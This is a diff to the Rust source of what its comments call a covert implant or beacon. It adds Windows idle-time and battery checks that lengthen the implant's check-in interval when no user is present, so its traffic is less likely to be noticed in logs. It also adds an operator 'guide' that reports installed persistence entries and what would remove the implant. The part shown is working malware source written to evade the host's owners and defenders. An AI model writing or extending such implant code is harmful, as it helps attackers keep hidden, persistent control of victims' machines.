@@ -1895,6 +1895,212 @@ pub fn now_epoch() -> u64 {
         .unwrap_or(0)
 }
 
+// ---------------------------------------------------------------------------
+// The presence of the person in front of the machine
+// ---------------------------------------------------------------------------
+
+/// What the operating system says about the machine it runs on.
+///
+/// The implant is quiet when nobody is watching.  A machine that has been
+/// idle for hours is a machine where a check-in in the middle of the night
+/// is a line in a log that somebody may read one day, and a laptop that
+/// runs on its battery is a machine that is not at a desk.  The operating
+/// system knows both things; the implant asks.
+///
+/// Not every platform answers.  Windows answers with the time of the last
+/// input and with the state of the power, and everywhere else the answer
+/// is "this platform cannot tell" -- the implant says that instead of
+/// guessing, because a guess that is wrong is worse than no answer.
+#[derive(Debug, Clone, Default)]
+pub struct Presence {
+    /// The seconds since the last input of the person, when the platform
+    /// knows.
+    pub idle_seconds: Option<u64>,
+    /// "mains", "battery", "battery_low" or "unknown", when the platform
+    /// knows.
+    pub power: Option<String>,
+}
+
+impl Presence {
+    /// Is the machine asleep in the sense of "nobody touches it"?
+    pub fn idle(&self) -> bool {
+        matches!(self.idle_seconds, Some(seconds) if seconds >= 300)
+    }
+
+    /// Is the machine running on its battery?
+    pub fn on_battery(&self) -> bool {
+        matches!(self.power.as_deref(), Some("battery") | Some("battery_low"))
+    }
+}
+
+/// Look at the machine and say who is around.
+pub fn presence() -> Presence {
+    Presence {
+        idle_seconds: idle_seconds(),
+        power: power_source(),
+    }
+}
+
+/// The factor the sleep interval is multiplied with when nobody is there.
+///
+/// A machine that is idle for five minutes gets a little quieter; a
+/// machine that is idle for half an hour gets a lot quieter.  The factor is
+/// one when the platform cannot tell, so nothing changes by accident.
+pub fn idle_factor(presence: &Presence) -> f64 {
+    match presence.idle_seconds {
+        Some(seconds) if seconds >= 1800 => 3.0,
+        Some(seconds) if seconds >= 300 => 1.5,
+        _ => 1.0,
+    }
+}
+
+/// The guide: what keeps the implant alive on this host, and what stops it.
+///
+/// The question is the same everywhere, and it is the question an operator
+/// asks before a weekend: what will the operating system do to the implant
+/// while nobody is looking?  On a phone the answer is a list of rules the
+/// manufacturer added (the autostart, the battery, the notifications); on
+/// a desktop the answer is the power of the machine, the presence of the
+/// person in front of it and the persistence that is installed.
+pub fn guide() -> String {
+    let mut out = String::new();
+    let presence = presence();
+    match presence.idle_seconds {
+        Some(seconds) => {
+            out.push_str(&format!(
+                "guide: the machine has been idle for {seconds} seconds\n"
+            ));
+        }
+        None => out.push_str(
+            "guide: this platform cannot tell how long the machine has been idle\n",
+        ),
+    }
+    match presence.power.as_deref() {
+        Some("mains") => out.push_str("guide: the machine runs on the mains\n"),
+        Some("battery") => out.push_str("guide: the machine runs on its battery\n"),
+        Some("battery_low") => out.push_str("guide: the battery of the machine is low\n"),
+        Some(_) => out.push_str("guide: the power of the machine is unknown\n"),
+        None => out.push_str("guide: this platform cannot tell what the power is\n"),
+    }
+    match crate::persist::list(&Value::Null) {
+        Ok(report) => {
+            if report.entries.is_empty() {
+                out.push_str("guide: nothing is installed on this host yet\n");
+            } else {
+                out.push_str(&format!(
+                    "guide: {} persistence entries are installed\n",
+                    report.entries.len()
+                ));
+            }
+        }
+        Err(_) => out.push_str("guide: the persistence entries could not be read\n"),
+    }
+    if presence.on_battery() {
+        out.push_str("guide: the implant is quieter on the battery\n");
+    }
+    out.push_str(
+        "guide: a desktop has no vendor rules; what stops the implant here is the deletion of its file and the replacement of its binary\n",
+    );
+    out
+}
+
+#[cfg(windows)]
+mod win {
+    pub type DWORD = u32;
+    pub type BOOL = i32;
+
+    #[repr(C)]
+    pub struct LastInputInfo {
+        pub cb_size: DWORD,
+        pub dw_time: DWORD,
+    }
+
+    #[repr(C)]
+    pub struct PowerStatus {
+        pub ac_line: u8,
+        pub battery_flag: u8,
+        pub battery_life: u8,
+        pub system_status: u8,
+        pub time_to_full: u32,
+        pub time_to_save: u32,
+        pub battery_current: u32,
+        pub battery_full: u32,
+        pub battery_voltage: u32,
+    }
+
+    #[link(name = "user32")]
+    extern "system" {
+        pub fn GetLastInputInfo(info: *mut LastInputInfo) -> BOOL;
+    }
+
+    #[link(name = "kernel32")]
+    extern "system" {
+        pub fn GetTickCount() -> DWORD;
+        pub fn GetSystemPowerStatus(status: *mut PowerStatus) -> BOOL;
+    }
+}
+
+/// The seconds since the last input of the person at the keyboard.
+#[cfg(windows)]
+fn idle_seconds() -> Option<u64> {
+    let mut info = win::LastInputInfo {
+        cb_size: std::mem::size_of::<win::LastInputInfo>() as u32,
+        dw_time: 0,
+    };
+    // The call only fills the structure; the structure is on the stack and
+    // holds nothing that has to be wiped.
+    if unsafe { win::GetLastInputInfo(&mut info) } == 0 {
+        return None;
+    }
+    let now = unsafe { win::GetTickCount() };
+    Some(u64::from(now.wrapping_sub(info.dw_time) / 1000))
+}
+
+#[cfg(not(windows))]
+fn idle_seconds() -> Option<u64> {
+    // The desktop of a Unix system has no single answer: the X server
+    // knows, the Wayland compositor knows, and neither of them is a
+    // dependency this beacon may take.
+    None
+}
+
+/// Where the power comes from.
+#[cfg(windows)]
+fn power_source() -> Option<String> {
+    let mut status = win::PowerStatus {
+        ac_line: 0,
+        battery_flag: 0,
+        battery_life: 0,
+        system_status: 0,
+        time_to_full: 0,
+        time_to_save: 0,
+        battery_current: 0,
+        battery_full: 0,
+        battery_voltage: 0,
+    };
+    if unsafe { win::GetSystemPowerStatus(&mut status) } == 0 {
+        return None;
+    }
+    Some(match status.ac_line {
+        1 => "mains".to_string(),
+        0 => {
+            if status.battery_flag == 255 {
+                "unknown".to_string()
+            } else if status.battery_life <= 20 {
+                "battery_low".to_string()
+            } else {
+                "battery".to_string()
+            }
+        }
+        _ => "unknown".to_string(),
+    })
+}
+
+#[cfg(not(windows))]
+fn power_source() -> Option<String> {
+    None
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
